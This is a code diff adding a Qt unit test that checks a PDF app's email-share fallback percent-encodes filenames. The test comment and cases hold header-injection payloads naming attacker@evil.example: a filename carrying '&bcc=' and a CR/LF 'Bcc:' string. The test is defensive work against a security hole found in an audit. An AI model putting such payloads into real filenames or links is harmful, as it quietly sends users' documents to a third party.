@@ -210,6 +210,52 @@ private slots:
         QCOMPARE(parsed.value(), ToolId::ExpiryDate);
         QCOMPARE(toolIdToString(ToolId::ExpiryDate), QStringLiteral("expiryDate"));
     }
+
+    // ── M-2 (AUDIT-SECURITY-2026-09-25, CWE-93): mailto header injection ──
+    //
+    // The non-MAPI share fallback interpolates the document FILENAME (fully
+    // attacker-influenceable document data) into a mailto query unencoded:
+    // a file named "q1 report&bcc=attacker@evil.example.pdf" produced
+    // "mailto:?subject=...q1 report&bcc=attacker@evil.example..." — the mail
+    // client parsed a hidden BCC to the attacker. A CR/LF payload
+    // ("%0d%0aBcc: attacker@evil.example") injected headers the same way.
+    // The composed URL must carry exactly one raw query separator and no
+    // header-significant byte inside either interpolated value.
+    void testShareEmailUrlEncodesHeaderSignificantChars() {
+        // (1) The audit's attack shape: raw CR/LF BCC injection.
+        {
+            const QString crlfSubject =
+                QStringLiteral("PDF Document: q.pdf%0d%0aBcc: attacker@evil.example");
+            const QString url = gp::HomeController::shareEmailUrl(
+                crlfSubject, QStringLiteral("Please find the attached PDF document."));
+            QVERIFY2(!url.contains(QLatin1Char('\r')) && !url.contains(QLatin1Char('\n')),
+                     "CRLF must be percent-encoded, not injected as a header break");
+            QCOMPARE(url.count(QLatin1Char('&')), 1);   // only the subject/body separator
+            QVERIFY2(!url.contains(QStringLiteral("bcc="), Qt::CaseInsensitive),
+                     "no raw bcc= header may survive encoding");
+            QVERIFY(url.startsWith(QStringLiteral("mailto:?subject=")));
+            QVERIFY(url.contains(QStringLiteral("&body=")));
+        }
+
+        // (2) The audit's second shape: raw '&' query-smuggling filename.
+        {
+            const QString hostileSubject = QStringLiteral("PDF Document: q1 report&bcc=attacker@evil.example.pdf");
+            const QString url = gp::HomeController::shareEmailUrl(
+                hostileSubject, QStringLiteral("body"));
+            QCOMPARE(url.count(QLatin1Char('&')), 1);
+            QVERIFY2(!url.contains(QStringLiteral("bcc="), Qt::CaseInsensitive),
+                     "a hostile filename must not add a query parameter");
+        }
+
+        // (3) Benign semantics survive: unreserved characters stay readable.
+        {
+            const QString url = gp::HomeController::shareEmailUrl(
+                QStringLiteral("PDF Document: report.pdf"),
+                QStringLiteral("Please find the attached PDF document."));
+            QVERIFY(url.startsWith(QStringLiteral("mailto:?subject=PDF%20Document%3A%20report.pdf")));
+            QVERIFY(url.contains(QStringLiteral("&body=Please%20find")));
+        }
+    }
 };
 
 QTEST_MAIN(TestControllers)
